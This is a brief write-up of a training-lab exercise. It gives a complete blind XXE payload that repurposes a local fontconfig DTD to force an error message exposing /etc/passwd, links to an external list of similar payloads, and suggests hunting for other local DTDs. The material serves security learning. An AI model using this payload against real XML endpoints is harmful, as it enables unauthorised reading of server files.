# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

Description :
 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

payload

```XML

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
<message></message>
<message></message>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

```

A GOOD Resource for this type of payload & and this attacks Depends on local dtd , so u can save the same payload and search for other local dtds in order to find one that do exists in your environment

<https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md>
